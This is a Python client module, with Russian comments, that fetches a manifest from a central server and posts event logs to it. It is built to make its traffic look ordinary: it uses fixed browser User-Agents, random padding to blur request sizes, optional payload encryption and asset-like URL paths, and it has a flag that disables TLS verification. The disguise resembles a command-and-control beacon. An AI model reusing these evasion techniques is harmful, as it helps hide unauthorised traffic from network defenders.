"""Клиент канала к центру: HTTPS, обычные заголовки браузера, случайный размер запросов (MASK-1, 2, 5)."""
from __future__ import annotations

import asyncio
import json
import os
import random
import ssl
import string
import urllib.error
import urllib.request

try:
    from .crypto import decrypt_payload, derive_payload_key, encrypt_payload
except ImportError:  # нет python3-cryptography (старый шаблон): работаем открытым каналом, а не падаем
    decrypt_payload = derive_payload_key = encrypt_payload = None

VERSION = "2.0"
USER_AGENTS = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
)


class CenterError(Exception):
    pass


class CenterClient:
    def __init__(self, base_url: str, token: str, ca_file: str = "", insecure: bool = False, timeout: float = 15.0, encrypt: bool = True):
        self.base = base_url.rstrip("/")
        self.token = token
        self.timeout = timeout
        self.ua = random.choice(USER_AGENTS)  # один UA на запуск: постоянный «браузер», а не шумящий каждый раз
        self.encrypt = encrypt and derive_payload_key is not None and (os.environ.get("HF_ENCRYPT_PAYLOAD", "1") != "0")
        self.key = derive_payload_key(token) if (token and derive_payload_key) else None
        if insecure:  # только для демо со самоподписанным сертификатом; в проде задаётся HF_CA_FILE
            ctx = ssl.create_default_context()
            ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
        else:
            ctx = ssl.create_default_context(cafile=ca_file or None)
        self.ctx = ctx

    def _request(self, method: str, path: str, body: dict | None = None) -> dict:
        data = None
        if body is not None:
            # Случайный «мусорный» хвост: размеры запросов не складываются в узнаваемый шаблон (MASK-5).
            body = {**body, "pad": "".join(random.choices(string.ascii_letters, k=random.randint(16, 256)))}
            data = json.dumps(body).encode()
        req = urllib.request.Request(self.base + path, data=data, method=method, headers={
            "Authorization": f"Bearer {self.token}", "User-Agent": self.ua, "Accept": "application/json",
            **({"Accept-Encoding-Custom": "enc"} if self.key else {}), "Accept-Language": "en-US,en;q=0.9",
            **({"Content-Type": "application/json"} if data else {})})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx) as resp:
                return json.loads(resp.read() or b"{}")
        except (urllib.error.URLError, TimeoutError, ssl.SSLError, ValueError, OSError) as exc:
            raise CenterError(str(exc)) from exc

    async def manifest(self) -> dict:
        resp = await asyncio.to_thread(self._request, "GET", f"/assets/v1/manifest.json?v={VERSION if self.key else '1.0'}")
        if isinstance(resp, dict) and "enc" in resp and self.key:
            return decrypt_payload(resp, self.key)
        return resp

    async def send(self, events: list[dict]) -> dict:
        payload = {"events": events}
        if self.encrypt and self.key:
            body = encrypt_payload(payload, self.key)
        else:
            body = payload
        return await asyncio.to_thread(self._request, "POST", "/assets/v1/log", body)
